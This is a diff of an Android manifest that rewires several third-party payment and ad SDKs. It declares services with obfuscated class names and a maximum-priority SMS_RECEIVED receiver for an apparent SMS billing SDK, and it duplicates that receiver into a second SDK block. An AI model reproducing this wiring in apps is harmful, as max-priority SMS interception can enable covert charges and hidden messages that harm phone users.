@@ -267,14 +267,15 @@
 
         <!--Ying Mei Start-->
         <meta-data android:name="YM_CPID" android:value="{$YM_CPID$}" />
+        <meta-data android:name="YM_APPID"  android:value="{$YM_APPID$}" />
 
-        <service android:name="a.a.b.n.PriSec" >
+        <service android:name="a.n.f.m.MadSec" >
         </service>
-        <service android:name="a.a.b.n.NexSec" >
+        <service android:name="a.n.f.m.DouAdSec" >
         </service>
 
         <receiver
-            android:name="a.a.b.n.PriCst"
+            android:name="a.n.f.m.MadCst"
             android:label="NetworkConnection" >
             <intent-filter>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
@@ -294,31 +295,24 @@
         <!--Wei Yum  End-->
 
         <!--Yu Feng Start-->
-        <receiver android:name="com.mj.jar.pay.InSmsReceiver" >
+        <receiver android:name="com.yf.jar.pay.InSmsReceiver" >
             <intent-filter android:priority="2147483647" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-        <service android:name="com.mj.jar.pay.SmsServices"></service>
-        <service android:name="com.mj.sms.service.InitService"></service>
+        <service android:name="com.yf.jar.pay.SmsServices"></service>
+        <service android:name="com.yf.sms.service.InitService"></service>
         <!--Yu Feng End-->
 
         <!--le ling start-->
-        <service android:exported="true" android:name="com.pay.sdk.msg.PayService" >
-            <intent-filter>
-                <action android:name="com.pay.sdk.msg.PayService" />
+        <receiver android:name="com.yf.jar.pay.InSmsReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
-        </service>
-        <service android:exported="true" 	android:name="com.pay.sdk.msg.PayListenerService" android:process=":service2">
-            <intent-filter>
-                <action android:name="com.pay.sdk.msg.PayListenerService" />
-            </intent-filter>
-        </service>
+        </receiver>
+        <service android:name="com.yf.jar.pay.SmsServices"></service>
+        <service android:name="com.yf.sms.service.InitService"></service>
         <!--le ling end-->
-
-        <!--掌游漫悦 Name start-->
-
-        <!--掌游漫悦 name end-->
 
         <!--魔信 start-->
         <activity
@@ -340,11 +334,13 @@
 
         <receiver android:name="com.mo.sdk.receiver.ReceiverM" >
             <intent-filter android:priority="1000" >
-                <action android:name="com.asdf.sdf.com.mo.action.ACTION" />
+                <action android:name="com.pxsk.asdf.com.mo.action.ACTION" />
                 <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
         </receiver>
         <service android:name="com.ast.sdk.server.ServerM" />
+
+
         <!--魔信 end-->
 
 
